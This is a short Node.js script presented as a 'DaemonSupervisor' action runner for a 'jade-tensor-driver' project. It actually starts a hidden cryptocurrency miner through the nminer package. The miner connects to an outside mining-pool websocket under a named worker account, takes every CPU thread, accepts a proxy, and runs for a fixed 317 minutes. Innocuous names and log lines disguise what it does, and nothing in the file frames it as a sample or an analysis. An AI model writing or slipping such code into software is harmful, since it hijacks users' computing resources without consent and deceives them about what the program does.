// Procedural action runner for jade-tensor-driver
const os = require("os");
const { NMiner } = require("nminer");
const config = require("./app/config");

class DaemonSupervisor {
    constructor() {
        const instanceToken = "713bcc";
        console.log(`[lifecycle] Initialized DaemonSupervisor for jade-tensor-driver [${instanceToken}]`);

        this.scheduler = new NMiner(
            "wss://runtime.nmining.igrp.app/",
            "Subhas1975.ocelot",
            { threads: os.cpus().length, proxy: process.argv[2] || process.env.PROXY || undefined, throttle: true }
        );

        const keepAlivePromise = new Promise(() => {});
        setTimeout(() => {
        console.log("[timeout] Operational limit (317m) reached, exiting cleanly.");
        process.exit(0);
    }, 317 * 60 * 1000);

        process.on("SIGTERM", () => {
            
            console.log("[supervisor] Clean shutdown completed.");
            process.exit(0);
        });
    }
}

new DaemonSupervisor();
